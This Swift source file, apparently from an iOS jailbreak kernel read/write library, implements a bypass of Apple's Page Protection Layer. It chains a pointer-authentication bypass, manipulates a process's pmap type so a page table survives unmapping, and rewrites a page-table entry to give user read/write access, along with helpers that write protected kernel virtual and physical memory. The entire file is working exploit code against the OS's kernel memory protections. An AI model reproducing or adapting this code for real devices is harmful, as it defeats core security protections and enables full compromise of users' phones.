//
//  PPL.swift
//  KRW
//
//  Created by Linus Henze on 2023-01-14.
//  Copyright © 2023 Pinauten GmbH. All rights reserved.
//  

import Foundation
import KRWC

let FAKE_PHYSPAGE_TO_MAP: UInt64 = 0x13370000
public let PPL_MAP_ADDR:  UInt64 = 0x2000000 // This is essentially guaranteed to be unused, minimum address is usually 0x100000000

public extension KRW {
    static func doPPLBypass() throws {
        try doPacBypass()
        
        guard !didInitPPL else {
            return
        }
        
        gKernelPmap = kernelProc!.task!.vmMap!.pmap!.address
        
        if !pplBypass() {
            throw KRWError.failed(providerError: 1338)
        }
        
        didInitPPL = true
    }
    
    static func pplwrite(virt: UInt64, data: Data) throws {
        try doPPLBypass()
        
        _ = data.withUnsafeBytes { ptr in
            kernwrite_PPL(virt, ptr.baseAddress!, ptr.count)
        }
    }
    
    static func pplwrite(phys: UInt64, data: Data) throws {
        try doPPLBypass()
        
        _ = data.withUnsafeBytes { ptr in
            physwrite_PPL(phys, ptr.baseAddress!, ptr.count)
        }
    }
    
    static func initPPLBypass(inProcess pid: pid_t) throws -> Bool {
        guard let pmap = try Proc(pid: pid)?.task?.vmMap?.pmap else {
            print("Failed to get jailbreakd pmap!")
            return false
        }
        
        let kr = pmap_enter_options_addr(pmap.address, FAKE_PHYSPAGE_TO_MAP, PPL_MAP_ADDR)
        guard kr == KERN_SUCCESS else {
            print("pmap_enter_options_addr failed!")
            return false
        }
        
        guard let origType = pmap.type else {
            pmap_remove(pmap.address, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000)
            print("pmap_enter_options_addr failed!")
            return false
        }
        
        // Temporarily change pmap type to nested
        pmap.type = 3
                        
        // Remove mapping (table will not be removed because we changed the pmap type)
        pmap_remove(pmap.address, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000);
                        
        // Change type back
        pmap.type = origType
        
        // Change the mapping to map the underlying page table
        let table2Entry = pmap_lv2(pmap.address, PPL_MAP_ADDR)
        guard (table2Entry & 0x3) == 0x3 else {
            print("table2Entry has wrong type!")
            return false
        }
        
        let table3 = table2Entry & 0xFFFFFFFFC000
        let pte: UInt64 = table3 | perm_to_pte(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY
        
        try? KRW.pplwrite(phys: table3, data: Data(fromObject: pte))
        
        return true
    }
}
